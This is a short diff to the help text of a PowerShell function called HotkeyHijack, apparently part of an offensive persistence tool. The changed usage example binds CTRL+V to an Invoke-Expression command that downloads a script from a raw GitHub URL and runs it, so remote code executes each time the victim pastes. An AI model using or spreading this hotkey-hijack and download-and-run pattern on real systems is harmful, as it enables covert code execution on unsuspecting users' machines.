@@ -17,7 +17,7 @@ Function HotkeyHijack {
 
     .EXAMPLE
     
-    HotkeyHijack -HotKey "CTRL+V" -Command "IEX([net.webclient]::new().downloadstring('calc.txt'))"
+    HotkeyHijack -HotKey "CTRL+V" -Command "IEX([net.webclient]::new().downloadstring('https://raw.githubusercontent.com/huntr-huntr/Cache/main/scripts/calc.txt'))"
 
     .NOTES
     
